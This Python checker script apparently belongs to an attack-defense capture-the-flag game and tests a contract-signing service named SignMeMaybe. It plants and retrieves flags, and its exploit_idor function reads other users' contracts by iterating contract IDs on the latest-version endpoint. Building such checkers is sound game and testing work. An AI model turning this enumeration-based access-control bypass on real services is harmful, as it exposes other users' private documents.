from __future__ import annotations

import asyncio
import json
import os
import random
import re
import string
from logging import LoggerAdapter
from typing import Any, Iterable, Optional
from urllib import error, request

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    GetflagCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    PutflagCheckerTaskMessage,
)
from enochecker3.utils import assert_equals, assert_in

"""
Checker config
"""

SERVICE_PORT = 1984
HTTP_TIMEOUT_SECONDS = float(os.getenv("SIGNMEMAYBE_CHECKER_TIMEOUT", "5"))
MAX_CONTRACT_ID = int(os.getenv("SIGNMEMAYBE_MAX_CONTRACT_ID", "250"))

checker = Enochecker("SignMeMaybe", SERVICE_PORT)
app = lambda: checker.app


"""
Utility functions
"""

JsonObject = dict[str, Any]


def random_suffix(length: int = 16) -> str:
    alphabet = string.ascii_lowercase + string.digits
    return "".join(random.choice(alphabet) for _ in range(length))


def service_base_url(task: Any) -> str:
    address = getattr(task, "address", None) or getattr(task, "host", None)
    if not isinstance(address, str) or not address:
        raise MumbleException("Checker task did not contain a target address")
    return f"http://{address}:{SERVICE_PORT}"


def require_json_object(value: Any, context: str) -> JsonObject:
    if not isinstance(value, dict):
        raise MumbleException(f"{context} did not return a JSON object")
    return value


class HttpClient:
    def __init__(self, base_url: str, logger: LoggerAdapter):
        self.base_url = base_url.rstrip("/")
        self.logger = logger

    async def request_json(
        self,
        method: str,
        path: str,
        body: JsonObject | None = None,
        token: str | None = None,
    ) -> tuple[int, Any]:
        return await asyncio.to_thread(self._request_json_sync, method, path, body, token)

    def _request_json_sync(
        self,
        method: str,
        path: str,
        body: JsonObject | None,
        token: str | None,
    ) -> tuple[int, Any]:
        url = self.base_url + path
        data: bytes | None = None
        headers: dict[str, str] = {"Accept": "application/json"}

        if body is not None:
            data = json.dumps(body).encode("utf-8")
            headers["Content-Type"] = "application/json"

        if token is not None:
            headers["X-Session-Token"] = token

        req = request.Request(url, data=data, headers=headers, method=method)
        self.logger.debug("Sending %s %s", method, path)

        try:
            with request.urlopen(req, timeout=HTTP_TIMEOUT_SECONDS) as resp:
                return resp.status, self._decode_response(resp.read())
        except error.HTTPError as exc:
            return exc.code, self._decode_response(exc.read())
        except (error.URLError, TimeoutError, ConnectionError, OSError) as exc:
            self.logger.debug("Connection to service failed: %r", exc)
            raise OfflineException("Could not connect to service") from exc

    @staticmethod
    def _decode_response(raw: bytes) -> Any:
        if not raw:
            return None

        text = raw.decode("utf-8", errors="replace")
        try:
            return json.loads(text)
        except json.JSONDecodeError as exc:
            raise MumbleException("Service returned invalid JSON") from exc

    async def register_user(self, username: str, password: str) -> tuple[int, str, str]:
        status, data = await self.request_json(
            "POST",
            "/api/register",
            {
                "username": username,
                "password": password,
            },
        )

        if status != 200:
            raise MumbleException(f"Failed to register user: HTTP {status}")

        data_obj = require_json_object(data, "register response")
        user_id = data_obj.get("userId")
        token = data_obj.get("token")

        if not isinstance(user_id, int) or user_id <= 0:
            raise MumbleException("Register response did not contain a valid userId")
        if not isinstance(token, str) or not token:
            raise MumbleException("Register response did not contain a valid token")

        return user_id, username, token

    async def login_user(self, username: str, password: str) -> tuple[int, str, str]:
        status, data = await self.request_json(
            "POST",
            "/api/login",
            {
                "username": username,
                "password": password,
            },
        )

        if status != 200:
            raise MumbleException(f"Failed to login user: HTTP {status}")

        data_obj = require_json_object(data, "login response")
        user_id = data_obj.get("userId")
        token = data_obj.get("token")

        if not isinstance(user_id, int) or user_id <= 0:
            raise MumbleException("Login response did not contain a valid userId")
        if not isinstance(token, str) or not token:
            raise MumbleException("Login response did not contain a valid token")

        return user_id, username, token

    async def create_contract(self, token: str, title: str, content: str) -> int:
        status, data = await self.request_json(
            "POST",
            "/api/contracts",
            {
                "title": title,
                "content": content,
            },
            token=token,
        )

        if status not in (200, 201):
            raise MumbleException(f"Failed to create contract: HTTP {status}")

        data_obj = require_json_object(data, "contract creation response")
        contract_id = data_obj.get("contractId")

        if not isinstance(contract_id, int) or contract_id <= 0:
            raise MumbleException("Contract creation response did not contain a valid contractId")

        return contract_id

    async def list_contracts(self, token: str) -> list[JsonObject]:
        status, data = await self.request_json("GET", "/api/contracts", token=token)

        if status != 200:
            raise MumbleException(f"Failed to list contracts: HTTP {status}")

        data_obj = require_json_object(data, "contract list response")
        contracts = data_obj.get("contracts")

        if not isinstance(contracts, list):
            raise MumbleException("Contract list response did not contain a contracts list")

        return [contract for contract in contracts if isinstance(contract, dict)]

    async def latest_contract_version(self, token: str, contract_id: int) -> tuple[int, Any]:
        return await self.request_json(
            "GET",
            f"/api/contracts/{contract_id}/versions/latest",
            token=token,
        )


def make_client(task: Any, logger: LoggerAdapter) -> HttpClient:
    return HttpClient(service_base_url(task), logger)


def get_string_field(data: JsonObject, key: str, context: str) -> str:
    value = data.get(key)
    if not isinstance(value, str):
        raise MumbleException(f"{context} did not contain a valid {key}")
    return value


def extract_contract_ids_from_hints(task: ExploitCheckerTaskMessage) -> list[int]:
    possible_hints = [
        getattr(task, "attack_info", None),
        getattr(task, "flag_ids", None),
        getattr(task, "flag_id", None),
    ]

    found: list[int] = []
    for hint in possible_hints:
        found.extend(_extract_contract_ids(hint))

    seen: set[int] = set()
    unique_ids: list[int] = []
    for contract_id in found:
        if contract_id > 0 and contract_id not in seen:
            seen.add(contract_id)
            unique_ids.append(contract_id)

    return unique_ids


def _extract_contract_ids(value: Any) -> list[int]:
    if value is None:
        return []

    if isinstance(value, int):
        return [value]

    if isinstance(value, str):
        return [int(match) for match in re.findall(r"\d+", value)]

    if isinstance(value, dict):
        result: list[int] = []
        for key in ("contractId", "contract_id", "id", "hint"):
            if key in value:
                result.extend(_extract_contract_ids(value[key]))
        if not result:
            for nested in value.values():
                result.extend(_extract_contract_ids(nested))
        return result

    if isinstance(value, Iterable):
        result: list[int] = []
        for nested in value:
            result.extend(_extract_contract_ids(nested))
        return result

    return []


"""
CHECKER FUNCTIONS
"""


@checker.putflag(0)
async def putflag_contract(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> int:
    client = make_client(task, logger)

    username = "checker_" + random_suffix(16)
    password = "checkerpass_" + random_suffix(16)
    title = "Signing Package " + random_suffix(12)

    logger.debug("Registering flag owner")
    _user_id, _username, token = await client.register_user(username, password)

    logger.debug("Creating contract that contains the flag")
    contract_id = await client.create_contract(token, title, task.flag)

    logger.debug("Checking that the new contract is present in the owner's list")
    contracts = await client.list_contracts(token)
    listed_ids = [contract.get("contractId") for contract in contracts]
    assert_in(contract_id, listed_ids, "Created contract was not visible in the owner's list")

    await db.set(
        "contract",
        {
            "username": username,
            "password": password,
            "title": title,
            "contract_id": contract_id,
        },
    )

    # I return the contract id as attack hint so exploits do not have to scan the whole service.
    return contract_id


@checker.getflag(0)
async def getflag_contract(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    client = make_client(task, logger)

    try:
        stored = await db.get("contract")
        username = stored["username"]
        password = stored["password"]
        contract_id = int(stored["contract_id"])
    except (KeyError, TypeError, ValueError) as exc:
        raise MumbleException("Missing or broken database entry from putflag") from exc

    logger.debug("Logging in as the flag owner")
    _user_id, _username, token = await client.login_user(username, password)

    logger.debug("Retrieving own latest contract version")
    status, data = await client.latest_contract_version(token, contract_id)

    if status != 200:
        raise MumbleException(f"Could not retrieve stored contract: HTTP {status}")

    data_obj = require_json_object(data, "latest contract response")
    content = get_string_field(data_obj, "content", "latest contract response")
    assert_equals(content, task.flag, "Stored flag content was incorrect")


@checker.havoc(0)
async def havoc_health(task: HavocCheckerTaskMessage, logger: LoggerAdapter) -> None:
    client = make_client(task, logger)

    logger.debug("Checking health endpoint")
    status, data = await client.request_json("GET", "/health")

    if status != 200:
        raise MumbleException(f"Health endpoint returned HTTP {status}")

    data_obj = require_json_object(data, "health response")
    assert_equals(data_obj.get("status"), "ok", "Health endpoint did not report ok")


@checker.havoc(1)
async def havoc_contract_flow(task: HavocCheckerTaskMessage, logger: LoggerAdapter) -> None:
    client = make_client(task, logger)

    username = "havoc_" + random_suffix(16)
    password = "havocpass_" + random_suffix(16)
    title = "Havoc Contract " + random_suffix(12)
    content = "contract text " + random_suffix(32)

    logger.debug("Registering a havoc user")
    _user_id, _username, token = await client.register_user(username, password)

    logger.debug("Creating a havoc contract")
    contract_id = await client.create_contract(token, title, content)

    logger.debug("Retrieving the havoc contract")
    status, data = await client.latest_contract_version(token, contract_id)

    if status != 200:
        raise MumbleException(f"Could not retrieve havoc contract: HTTP {status}")

    data_obj = require_json_object(data, "havoc latest contract response")
    assert_equals(data_obj.get("contractId"), contract_id, "Wrong contract id returned")
    assert_equals(data_obj.get("title"), title, "Wrong contract title returned")
    assert_equals(data_obj.get("content"), content, "Wrong contract content returned")


@checker.exploit(0)
async def exploit_idor(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    logger: LoggerAdapter,
) -> Optional[str]:
    client = make_client(task, logger)

    username = "attacker_" + random_suffix(16)
    password = "attackpass_" + random_suffix(16)

    logger.debug("Registering attacker account")
    _user_id, _username, token = await client.register_user(username, password)

    contract_ids = extract_contract_ids_from_hints(task)
    if not contract_ids:
        contract_ids = list(range(1, MAX_CONTRACT_ID + 1))

    logger.debug("Trying %d contract ids via latest-version IDOR", len(contract_ids))
    for contract_id in contract_ids:
        status, data = await client.latest_contract_version(token, contract_id)

        if status == 404:
            continue
        if status == 401:
            raise MumbleException("Attacker session was rejected")
        if status != 200:
            logger.debug("Skipping contract %s because it returned HTTP %s", contract_id, status)
            continue
        if not isinstance(data, dict):
            continue

        raw = json.dumps(data, ensure_ascii=False).encode("utf-8", errors="replace")
        if flag := searcher.search_flag(raw):
            return flag

    raise MumbleException("flag not found")


if __name__ == "__main__":
    checker.run()